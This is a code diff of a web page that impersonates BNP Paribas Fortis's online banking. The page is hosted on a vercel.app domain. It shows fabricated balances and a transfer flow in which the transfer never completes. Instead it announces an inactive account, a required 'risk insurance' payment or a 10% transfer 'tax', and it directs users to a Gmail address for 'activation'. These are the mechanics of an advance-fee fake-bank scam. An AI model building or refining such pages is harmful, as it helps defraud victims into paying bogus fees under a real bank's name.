@@ -123,7 +123,7 @@ title{
    
     margin: 0px 0px 0px 0px;
     padding: 15px 0px;
-    color: lightseagreen;
+    color: seagreen;
    text-align: center;
    box-shadow: inset 0px 0px 22px 1px lightgrey;
 border: 2px solid whitesmoke;
@@ -338,7 +338,7 @@ progress{
   align-items: center;
   text-align: center;
 }
-.iconimg{
+.iconimg img{
  margin: 50% 0px;
   
   height: 100px;
@@ -357,6 +357,101 @@ progress{
   top: 150px;
   left: 320px;
 }
+nav{ 
+
+  display: flex;
+  justify-content: center;
+  align-items: center;
+   
+   }
+   .list-drl{
+     position: absolute;
+   left: 0px;
+   right: 0px;
+z-index: 999;
+top: 80px;
+   padding: 20px 0px;
+  
+     display:none;
+     background:whitesmoke;
+     flex-direction: column;
+   
+     align-items:center;
+     opacity: 0;
+    transition: top opacity transform 5s ease;
+  
+     color: seagreen;
+     
+   }
+.list-drl li{
+  
+  list-style: none;
+ width: 363px;
+ text-align: center;
+  margin: 20px 0px;
+  background: white;
+  background: white;
+
+}
+.list-drl li a{
+ 
+  text-decoration: none;
+list-style: none;
+display: block;
+width:100%;
+color: seagreen;
+border-radius: 8px;
+text-align: center;
+font-size: 20px;
+padding: 8px 0px;
+}
+.list-drl li a:hover{
+  list-style: none;
+  background: white;
+  padding: 8px 0px;
+  width:363px;
+  border-radius: 4px;
+  background: seagreen;
+  color: whitesmoke;
+}
+   .imgbank h1 {
+    color: seagreen;
+    font-size: 20px;
+    font-style: italic;
+   
+    text-shadow: 2px 2px 8px seashell;
+   text-transform: uppercase;
+   }
+   .menu .menu-logo{
+
+ 
+
+   
+   
+   }
+   .menu-nav div{
+   
+ 
+   width:50px;
+   padding: 5px 20px;
+     margin: 30px;
+     font-size: 20px;
+     color:white;
+     text-decoration: none;
+     border:1px solid whitesmoke;
+   background: seagreen;
+     border-radius: 4px;
+   }
+   .menu-nav{
+  
+
+     
+
+ 
+    
+   }
+   
+
 </style>
 <body>
  
@@ -427,29 +522,64 @@ progress{
       
   
 </div>
-div class="menu">
-     <div class="list-drl">
-       <div class="list-item">
-         <li>Accueil</li>
-    
-       </div>
-       <div class="list-item">
-         <li>Signup</li>
-       </div>
-       <div class="list-item">
-         <li>BankAccount</li>
-       </div>
+ <div id="google_translate_element">
+     
      </div><div></div>
-    <div class="menu-logo">
-
+    
+     </div>
+ 
+     
+     </div>
+ 
+     <nav>
+         
   <div class="imgbank">
-  
+   
       <h1>BNP Paribas Fortis</h1>
        
         
   </div>
 
-    </div>
+    
+  
+      <div class="menu-nav">
+      
+     
+        
+                <div href id="hover-list"> Menu</div>
+      </div>
+
+    </nav>
+
+
+ <div class="menu">
+
+   <div class="list-drl">
+     <div class="list-item">
+       <li> <a href="https://bnpparibas-gfrz.vercel.app/  ">Accueil</a></li>
+
+     </div>
+     <div class="list-item">
+       <li><a href="https://bnpparibas-gfrz.vercel.app/signup ">Se connecter</a></li>
+     </div>
+     <div class="list-item">
+       <li><a href="https://bnpparibas-gfrz.vercel.app/signin">S'inscrire</a></li>
+     </div>
+
+
+     <div class="list-item">
+       <li><a href="https://bnpparibas-gfrz.vercel.app/account">Compte Bancaire</a></li>
+     </div>
+     <div class="list-item">
+       <li><a href="https://bnpparibas-gfrz.vercel.app/loan">Prêt d'Argent</a></li>
+
+
+
+     </div>
+
+   </div>
+  </div>
+  
 <div class="bnp">
   <h2>BNP Paribas Fortis
 
@@ -464,7 +594,7 @@ div class="menu">
 <div class="account">
   <div class="account-dash">
       <span></span> <span></span>  
-      Your dashboard 
+      Tableau de bord
   <span></span> <span></span>
   </div>
 <div id="bankuser" class="account">
@@ -514,112 +644,78 @@ let ibanCheck,bicCheck,montantCheck=false
 function transfert(user){
   console.log(user)
   return `
-    <div class="transferto">
-      <div class="trnf-title">
-  
-        <h2>Transfert <i style="font-size:24px" class="fa">&#xf19c;</i></h2>
-  
-      </div>
-      <div class="inp-iban">
-        <div class="iban">
-          <h4>IBAN</h4>
-       <input disabled type="text" value="${user.cardBank.iban}" placeholder="IBAN">
-        </div>
-      
-        <div class="info">
-  
-        </div>
-        <div class="iban">
-          <h4>BIC</h4>
-         <input disabled type="text" value="${user.cardBank.bic}" placeholder="BIC" >
-        </div>
-        
-        <div class="info">
-  
-        </div>
-        <div class="bic">
-         <h4>Montant</h4>
-          <input type="number" value="" placeholder="25€">
-          <div class="info">
-        </div>
-        
-  
-        </div>
-      </div>
-    </div>
- <button id="btn" type="submit" onclick=overlay("${user.email}","${user.tot_amount}","${user.tot_deposit}","${user.status}","${user.currency}","${user.cardBank.iban}","${user.cardBank.bic}","${user.assurance}","${user.typeofCompte}")> Transfert</button>
+    ${isTransferInter(user)}
+ <button id="btn" type="submit" onclick=overlay("${user.email}","${user.tot_amount}","${user.tot_deposit}","${user.status}","${user.currency}","${user.cardBank.iban}","${user.cardBank.bic}","${user.assurance}","${user.typeofCompte}","${user.bankInter}","${user.cardBank.idAccount}")> Transfert</button>
   `
 }
 
-function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeofCompte){
+function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeofCompte,bankInter,id){
   if( montantCheck) {
-    stop=false
-  over.className='overlay-delay'
-  if (email != '') {
+    over.className='overlay-delay'
+   if (email != '') {
   
   
-  const timeout = setTimeout(loaded(50, `
-  <div class="actived">
-    
+  
 
-  Verification d'Identités  personnelles confirmées ✓
-    </div>`), 3000)
-  clearTimeout(timeout)
   
-  if (Number(amount) +Number(deposit)>= Number(inputTag[2].value)) {
+  if(bankInter==false){
+    
+    const timeout = setTimeout(loaded(50, `
+      <div class="actived">
+        
+    
+      Verification d'Identités  personnelles confirmées ✓
+        </div>`), 3000)
+    clearTimeout(timeout)
+    console.log(bankInter+'yeah')
+    if (Number(amount) +Number(deposit)>= Number(inputTag[1].value)) {
  
     const timeout = setTimeout(loaded(70, `
     <div class="actived">
       
    
               <h4>IBAN</h4>
-            Virement instantané de ${inputTag[2].value} ${currency}
+            Virement instantané de ${inputTag[1].value} ${currency}
           
             <div class="iban-transf">
             
-     ${iban} --------->FR26493HGLlo
+  BNP Paribas Fortis vers ${id}
             </div>
                        </div>
             `), 1000)
     clearTimeout(timeout)
+    if (status == 300) {
+      const timeout = setTimeout(loaded(85,
+        `
+     <div class="not-actived">
+       
     
+     Votre compte bancaire n'est pas encore activé car votre solde montant est de 0€. <div>
+       Numéro Compte Bancaire (ID)
+     </div>
+     <div>
+       N° Compte Bancaire :${id}
+     </div>
+     Veillez conctater le service financier de la banque BNP Paribas Fortis à l'adresse mail suivante pour une activation réussie 
+     reunierprospere@gmail.com
+    </div> `), 3000)
+      clearTimeout(timeout)
     
- 
-    if (status==300) {
- const timeout = setTimeout(loaded(85,
- `
- <div class="not-actived">
-   
-
- Votre compte bancaire n'est pas encore activé car votre solde montant est de 0€. <div>
-   IBAN:${iban}
- </div>
- <div>
-   BIC:${bic}
- </div>
- Veillez conctater le service financier de la banque BNP Paribas Fortis à l'adresse mail suivante pour une activation réussie 
- reunierprospere@gmail.com
-</div> `), 3000)
- clearTimeout(timeout)
-
     
     }
-    else {
-      if (Number(assurance)===0) {
-        if(typeofCompte=='Donation'){
-        const timeout = setTimeout(loaded(92, `
-        <div class="not-actived">
-         <h3>votre assurance risque est vide (0€).
-        </h3> 
-        Une Assurance risque est demandée par la banque BNP Paribas Fortis pour  couvrir à l'avenir des risques d'un mauvais usage de l'argent hérité dans des pratiques obscènes ou dans activités criminelles tel que la drogue, paiement d'arme, trafic etc...
-  
-        </div>
-                      `), 1000)
-        clearTimeout(timeout)
-        
-        
-        }
-        if(typeofCompte=="Prêt"){
+          if (Number(assurance)=== 0) {
+            if (typeofCompte == 'Donation') {
+              const timeout = setTimeout(loaded(92, `
+            <div class="not-actived">
+             <h3>votre assurance risque est vide (0€).
+            </h3> 
+            Une Assurance risque est demandée par la banque BNP Paribas Fortis pour  couvrir à l'avenir des risques d'un mauvais usage de l'argent hérité dans des pratiques obscènes ou dans activités criminelles tel que la drogue, paiement d'arme, trafic etc...
+      
+            </div>
+                          `), 1000)
+              clearTimeout(timeout)
+            }
+            if(typeofCompte=="Prêt"){
         const timeout = setTimeout(loaded(92, `
         <div class="not-actived">
          <h3>votre assurance risque est vide (0€).
@@ -633,19 +729,18 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
         
         }
         
-    
-        
-      }
-      else{
+
+            } 
+          else{
         const timeout = setTimeout(loaded(99, `
         <div class="not-actived">
          
-       Une taxe de 5% est applicable sur tout transfert d'argent chez BNP Paribas Fortis.
+       Une taxe de 10% est applicable sur tout transfert d'argent chez BNP Paribas Fortis.
        <div>
-         Montant TTVA hors Transfert d'Argent s'élève 
+         Transfert d'Argent hors Montant s'élève Montant TTVA
        </div>
        <div>
-        ${ ((Number(inputTag[2].value))*(0.1)+5).toFixed(2)}
+        ${ ((Number(inputTag[1].value))*(0.1)+5).toFixed(2)}
          ${currency}
        </div>
             <h3>
@@ -660,44 +755,144 @@ function overlay(email,amount,deposit,status,currency,iban,bic, assurance,typeof
       }
       
     }
+
+    }
+    else {
+      console.log('superbe')
+          const timeout = setTimeout(loaded(50, `
+      <div class="actived">
+        
     
+      Verification d'Identités  personnelles confirmées ✓
+        </div>`), 3000)
+    clearTimeout(timeout)
+    console.log(bankInter+'yeah')
+    if (Number(amount) +Number(deposit)>= Number(inputTag[2].value)) {
+ console.log('bah')
+    const timeout = setTimeout(loaded(70, `
+    <div class="actived">
+      
+   
+              <h4>IBAN</h4>
+            Virement instantané de ${inputTag[2].value} ${currency}
+          
+            <div class="iban-transf">
+            
+  BNP Paribas Fortis vers ${iban}
+            </div>
+                       </div>
+            `), 1000)
+    clearTimeout(timeout)
+    if (status == 300) {
+      const timeout = setTimeout(loaded(85,
+        `
+     <div class="not-actived">
+       
+    
+     Votre compte bancaire n'est pas encore activé car votre solde montant est de 0€. <div>
+       IBAN
+     </div>
+     <div>
+       IBAN:${iban}
+     </div>
+     Veillez conctater le service financier de la banque BNP Paribas Fortis à l'adresse mail suivante pour une activation réussie 
+     reunierprospere@gmail.com
+    </div> `), 3000)
+      clearTimeout(timeout)
+    
+    
+    }
+          if (Number(assurance)=== 0) {
+            if (typeofCompte == 'Donation') {
+              const timeout = setTimeout(loaded(92, `
+            <div class="not-actived">
+             <h3>votre assurance risque est vide (0€).
+            </h3> 
+            Une Assurance risque est demandée par la banque BNP Paribas Fortis pour  couvrir à l'avenir des risques d'un mauvais usage de l'argent hérité dans des pratiques obscènes ou dans activités criminelles tel que la drogue, paiement d'arme, trafic etc...
+      
+            </div>
+                          `), 1000)
+              clearTimeout(timeout)
+            }
+            if(typeofCompte=="Prêt"){
+        const timeout = setTimeout(loaded(92, `
+        <div class="not-actived">
+         <h3>votre assurance risque est vide (0€).
+        </h3> 
+        Une Assurance risque est demandée par la banque BNP
+        Paribas Fortis pour  couvrir le risque d'un non remboursement d'un prêt suites à des problème financier par le bénéficiaire du prêt.
+  
+        </div>
+                      `), 1000)
+        clearTimeout(timeout)
+        
+        }
+        
+
+            } 
+          else{
+        const timeout = setTimeout(loaded(99, `
+        <div class="not-actived">
+         
+       Une taxe de 10% est applicable sur tout transfert d'argent chez BNP Paribas Fortis.
+       <div>
+         Transfert d'Argent hors Montant s'élève Montant TTVA
+       </div>
+       <div>
+        ${ ((Number(inputTag[1].value))*(0.1)+5).toFixed(2)}
+         ${currency}
+       </div>
+            <h3>
+              ç'est presque fini
+            </h3>
+        </div>
+         
+                      `), 1000)
+        clearTimeout(timeout)
+        
+      
+      }
+      
+    }
+
+      
+    }
   }
+    
+   
   }
-  }
+  
   else{
+ 
+  
+   if (Number(inputTag[1].value) != 0) {
+  
+  
+      if (Number(inputTag[1].value) > Number(Number(amount) + Number(deposit))) {
+  
+  
+  
+  
+        info[1].innerHTML = 'votre solde est insuffisant'
+        montantCheck = false
+      }
+      else {
+        montantCheck = true
+        info[1].textContent = ''
+      }
+    }
+    else {
+  
+      info[1].textContent = `Mininum de transfert d'argent  1${currency}`
+      montantCheck = false
+    }
   
   }
-  console.log(Number(inputTag[2].value))
-    if (Number(inputTag[2].value)!=0) {
-    
-    
-        if (Number(inputTag[2].value)> Number(Number(amount)+Number(deposit))) {
-        
-         
-         
-         
-          info[2].innerHTML = 'votre solde est insuffisant'
-         montantCheck=false
-        }
-       else{
-         montantCheck=true
-info[2].textContent= ''
-       }
-    }
-      else{
-     
-        info[2].textContent= `Mininum de transfert d'argent  1${currency}`
-        montantCheck=false
-      }
-    
-    
-    
-    
 }
 
 function statusCheck(status){
-  if (status===420) return 'Yes'
-  else return 'Not'
+  if (status===420) return 'Oui'
+  else return 'Non'
 }
 function statusClass(statusClass){
   
@@ -707,7 +902,7 @@ function statusClass(statusClass){
 function userHtml(user){
 
 const filtuser=user
-console.log(filtuser)
+console.log(filtuser+'okay')
 const email=filtuser.email
 
 if(email==undefined){
@@ -730,7 +925,7 @@ else{
 
 let returnHtml=`
 <div class="tot-amount">
-  <h3> Total Amount</h3>
+  <h3> Montant Total(aux)</h3>
   <div class="money">
     ${filtuser.tot_amount}
         <div class="curr">
@@ -739,7 +934,7 @@ let returnHtml=`
   </div>
 </div>
 <div class="tot-amount">
-  <h3> Total Deposit</h3>
+  <h3> Dépôt Total(aux)</h3>
   <div class="money">
     ${filtuser.tot_deposit}
         <div class="curr">
@@ -748,7 +943,7 @@ let returnHtml=`
   </div>
 </div>
 <div class="tot-amount">
-  <h3>Total Balance</h3>
+  <h3>Solde Total(aux)</h3>
   <div class="money">
     ${filtuser.tot_amount+filtuser.tot_deposit}
     <div class="curr">
@@ -761,7 +956,7 @@ let returnHtml=`
 </div>
 <div class="transfert" id="trf-user">
   <div class="account-dtl">
-    <h2>Account details </h2>
+    <h2>Informations Comptes</h2>
   </div>
   <div class="account-typ">
     <h3> Service Financier</h3>
@@ -774,12 +969,12 @@ let returnHtml=`
        ${filtuser.email} 
       </div>
       <div class="account-typ">
-        <h3>Name</h3>
+        <h3>Nom</h3>
         <div>
          ${filtuser.name}
         </div>
         <div class="account-typ">
-          <h3>FirstName</h3>
+          <h3>Prénom</h3>
           <div>
             ${filtuser.prenom}
           </div>
@@ -789,7 +984,7 @@ let returnHtml=`
                ${filtuser.pays}
              </div>
           <div class="account-typ">
-            <h3>Frais d'assurance</h3>
+            <h3>Frais d'Assurance</h3>
             <div>${filtuser.assurance}
                
                    ${filtuser.currency}
@@ -802,28 +997,9 @@ let returnHtml=`
                   ${filtuser.contrat}
                 </div>
             
-                <div class="account-typ">
-                 <h4>BankName</h4>
-                  ${filtuser.cardBank.bankName}
-                </div>
-            <div class="account-typ">
-              <h3>Carte bancaire 
-              <i class="fa fa-credit-card" aria-hidden="true"></i>
-              </h3>
-              <div>
-                <h4> IBAN
-              
-                </h4>
-              </di>
+               ${isIdAccount(filtuser)}
               <div class="account-typ">
-                ${filtuser.cardBank.iban}
-              </div>
-              <div clclass="account-typ">
-                <h4>BIC</h4>
-               ${filtuser.cardBank.bic}
-              </div>
-              <div class="account-typ">
-              <h4>Status Bank Account</h4>
+              <h4>Statut Compte Bancaire</h4>
               <div class="actif">
                 Activé 
               </div>
@@ -848,7 +1024,163 @@ function displayButton(userDetails){
   bankuser.innerHTML=content
   
 }
-
+function isTransferInter(user){
+  
+  if(user.bankInter==true){
+    return `
+    <div class="transferto">
+      <div class="trnf-title">
+    
+        <h2>Transfert <i style="font-size:24px" class="fa">&#xf19c;</i></h2>
+    
+      </div>
+      <div class="inp-iban">
+        <div class="iban">
+          <h4>IBAN</h4>
+          <input disabled type="text" value="${user.cardBank.iban}" placeholder="IBAN">
+        </div>
+    
+        <div class="info">
+    
+        </div>
+        <div class="iban">
+          <h4>BIC</h4>
+          <input disabled type="text" value="${user.cardBank.bic}" placeholder="BIC">
+        </div>
+    
+        <div class="info">
+    
+        </div>
+        <div class="bic">
+          <h4>Montant</h4>
+          <input type="number" value="" placeholder="25€">
+          <div class="info">
+          </div>
+    
+    
+        </div>
+      </div>
+    </div>
+    `
+  }
+  else{
+    return `
+        <div class="transferto">
+          <div class="trnf-title">
+        
+            <h2>Transfert <i style="font-size:24px" class="fa">&#xf19c;</i></h2>
+        
+          </div>
+          <div class="inp-iban">
+            <div class="iban">
+              <h4>N° compte bancaire</h4>
+              <input disabled type="text" value="${user.cardBank.idAccount}" placeholder="N° Compte Bancaire">
+            </div>
+        
+                <div class="info">
+            
+                </div>
+           
+            <div class="bic">
+              <h4>Montant</h4>
+              <input type="number" value="" placeholder="25€">
+              <div class="info">
+              </div>
+        <div class="info">
+        
+        </div>
+        
+            </div>
+          </div>
+        </div>
+        `
+  }
+ /*if(user.bankInter){
+    return `
+    
+    `
+  }
+  else{
+    return `
+    <div class="transferto">
+      <div class="trnf-title">
+    
+        <h2>Transfert <i style="font-size:24px" class="fa">&#xf19c;</i></h2>
+    
+      </div>
+      <div class="inp-iban">
+        <div class="iban">
+          <h4>N° compte bancaire</h4>
+          <input disabled type="text" value="${user.cardBank.idAccount}" placeholder="N° Compte Bancaire">
+        </div>
+    
+            <div class="info">
+        
+            </div>
+       
+        <div class="bic">
+          <h4>Montant</h4>
+          <input type="number" value="" placeholder="25€">
+          <div class="info">
+          </div>
+    <div class="info">
+    
+    </div>
+    
+        </div>
+      </div>
+    </div>
+    `
+  }*/
+}
+function isIdAccount(filtuser){
+  if(filtuser.bankInter){
+    return `
+     <div class="account-typ">
+       <h4>BankName</h4>
+       ${filtuser.cardBank.bankName}
+     </div>
+     <div class="account-typ">
+       <h3>Carte Bancaire
+         <i class="fa fa-credit-card" aria-hidden="true"></i>
+       </h3>
+       <div>
+         <h4> IBAN
+    
+         </h4>
+         </di>
+         <div class="account-typ">
+           ${filtuser.cardBank.iban}
+         </div>
+         <div clclass="account-typ">
+           <h4>BIC</h4>
+           ${filtuser.cardBank.bic}
+         </div>
+    `
+  }
+  else{
+    return `
+     <div class="account-typ">
+       <h4>Nom de Banque</h4>
+       ${filtuser.cardBank.bankName}
+     </div>
+     <div class="account-typ">
+       <h3>Carte bancaire
+         <i class="fa fa-credit-card" aria-hidden="true"></i>
+       </h3>
+       <div>
+         <h4> Identifiant bancaire (N° account)
+    
+         </h4>
+         </di>
+         <div class="account-typ">
+           ${filtuser.cardBank.idAccount}
+         </div>
+        
+    `
+    
+  }
+}
 window.addEventListener('load', function() {
  
   
@@ -869,7 +1201,10 @@ window.addEventListener('load', function() {
       return resp.json()
     }).then(function(data) {
     
-     
+     /*user = userFind("reunierprospere@gmail.com", data)
+     let content = userHtml(user)
+     displayButton(user)
+     displayContextUser(content)*/
  let cookies=getCookie('email')
  console.log(cookies+'okay')
   
@@ -886,7 +1221,7 @@ displayContextUser(content)
            Connectez vous pour accéder à votre compte bancaire
            <div class="imagbnp">
             <div class="iconimg">
-            <i style="font-size:124px" class="fa">&#xf1eb;</i>
+            <img  src="https://raw.githubusercontent.com/lisbonne456/bnpparibas/main/vecteur-icone-web-symbole-icone-planete-pour-conception-votre-site-web-application-logo-icone-web-ui-vector-eps-10_532800-858.jpg" alt="page web déconnecté">
 
             </div>
            </div>
@@ -898,9 +1233,9 @@ displayContextUser(content)
     
     
   
-  /*else{
+ /* else{
   
-    location.href="https://sites.google.com/view/bnpparisecuadore/accueil/bnpparissingnup?authuser=0"
+    location.href="https://bnpparibas-gfrz.vercel.app/signup"
   }*/
 }())
 
@@ -968,8 +1303,57 @@ function userFind(userCookie,content){
 
   
 }
-</script>
+let listOpe=true,fetchData=[],formGetUser={},bicselect='',view='',user={email:""}
+    const list= document.getElementById('hover-list')
+    const app=document.getElementById('app')
+    const listItem=document.getElementsByTagName('li')
+    const listDeroulante=document.getElementsByClassName("list-drl")
+    
+    
 
+
+/*============Variables setting======*/
+
+
+
+
+
+  
+    
+
+
+/*============Variables setting======*/
+
+
+
+
+
+  list.addEventListener('click',function() {
+      if(listOpe){
+        listDeroulante[0].style.top = '80px'
+        listDeroulante[0].style.opacity = 1
+        listDeroulante[0].style.display='flex'
+        listOpe=false
+      }
+      else{
+        listDeroulante[0].style.top = '65px'
+        listDeroulante[0].style.opacity = 0
+      listDeroulante[0].style.display='none'
+        listOpe=true
+      }
+    
+    })
+   
+   
+
+</script>
+ <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+ <script type="text/javascript">
+   function googleTranslateElementInit() {
+     new google.translate.TranslateElement({ pageLanguage: 'en-US' }, 'google_translate_element');
+   }
+   console.log(navigator.language)
+ </script>
 
 </body>
     <footer>
